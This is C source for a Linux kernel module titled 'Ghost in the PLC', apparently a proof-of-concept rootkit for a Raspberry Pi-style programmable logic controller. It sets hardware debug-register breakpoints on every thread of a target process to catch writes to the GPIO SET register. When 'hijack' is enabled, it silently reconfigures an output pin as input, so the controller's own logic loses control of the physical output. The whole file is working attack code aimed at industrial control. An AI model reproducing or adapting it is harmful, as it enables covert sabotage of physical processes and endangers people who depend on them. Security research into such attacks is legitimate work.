/*
 * Usage: insmod drk.ko ppid=int gpioB=pchar hijack=int
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kallsyms.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/perf_event.h>
#include <linux/hw_breakpoint.h>

static int ppid = 0;
static int hijack = 0;
static long set_p = 0;
static char* gpioB = "0x00";
int tCount = 0;
static struct perf_event* pThread[20];
volatile unsigned* gpio = 0x00;
struct perf_event* drpcpu;

module_param(ppid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(ppid, "Process PID");
module_param(gpioB, charp, 0000);
MODULE_PARM_DESC(gpioB, "Base address of GPIO");
module_param(hijack, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(hijack, "Hijack the control"); // 1=Yes, 0=No

#define INP_GPIO(g) *(gpio+((g)/10)) &= ~(7<<(((g)%10)*3))
#define OUT_GPIO(g) *(gpio+((g)/10)) |=  (1<<(((g)%10)*3))
#define SET_GPIO_ALT(g,a) *(gpio+(((g)/10))) |= (((a)<=3?(a)+4:(a)==4?3:2)<<(((g)%10)*3))
#define GPIO_SET *(gpio+7)
#define GPIO_CLR *(gpio+10)
#define GET_GPIO(g) (*(gpio+13)&(1<<g))
#define GPIO_PULL *(gpio+37)
#define GPIO_PULLCLK0 *(gpio+38)

static void dr_excp_handler(struct perf_event *bp, struct perf_sample_data *data, struct pt_regs *regs) {

	int g = 22; // Pin 22 attached to LED
	if (hijack == 1) {
		INP_GPIO(g); // Set LED pin as input, so the logic could not write anymore
		printk(KERN_INFO "[RK] Hijacked!\n");
	}

}

static int __init hw_break_module_init(void) {
	int ret;
	long l;
	char *endptr;
	struct task_struct *tsk, *tTsk;
	struct perf_event_attr attr;

	printk(KERN_INFO "[RK] init\n");

	l = simple_strtol(gpioB, &endptr, 0);
	if (endptr == NULL) {
		printk(KERN_INFO "[RK] Failed to cast input address\n");
		return -EINVAL;
	}

	gpio = (unsigned *)l; // GPIO base
	set_p = (l+(long)0x1C); // Offset of SET register

	printk(KERN_INFO "[RK] Target process: %d\n", ppid);
	printk(KERN_INFO "[RK] GPIO Base address: %x %s %lu\n", (unsigned)gpio, gpioB, l);
	printk(KERN_INFO "[RK] GPIO SET Register: 0x%lx\n", set_p);
	printk(KERN_INFO "[RK] Hijack: %d\n", hijack);

	tsk = pid_task(find_vpid(ppid), PIDTYPE_PID);

	tTsk = tsk;
	if (tsk) {
		printk(KERN_INFO "[RK] Userland process struct_tsk PID: %d\n", ppid);
		do {
			hw_breakpoint_init(&attr);
			attr.bp_addr = set_p;
			attr.bp_len = HW_BREAKPOINT_LEN_4;
			attr.bp_type = HW_BREAKPOINT_W;

			drpcpu = register_user_hw_breakpoint(&attr, dr_excp_handler, NULL, tTsk);
			pThread[tCount] = drpcpu;
			if (IS_ERR((void*)drpcpu)) {
				ret = PTR_ERR((void*)drpcpu);
				printk(KERN_INFO "[RK] Setting debug registers... failed %d\n", ret);
				return ret;
			}

			printk(KERN_INFO "[RK] Setting debug registers... done\n");
			tCount += 1;
		} while_each_thread(tsk, tTsk);
		printk(KERN_INFO "[RK] Thread count: %d\n", tCount);
	} else {
		ret = PTR_ERR((void*)tsk);
		printk(KERN_INFO "[RK] Error pid_task failed %d\n", ret);
		return ret;
	}
	return 0;
}

static void __exit hw_break_module_exit(void) {

	int i;
	for (i = 0; i < tCount; i++) {
		unregister_hw_breakpoint(pThread[i]);
	}
	printk(KERN_INFO "[RK] exit\n");

}

module_init(hw_break_module_init);
module_exit(hw_break_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cl0wn & bl4ckic3");
MODULE_DESCRIPTION("Ghost in the PLC");
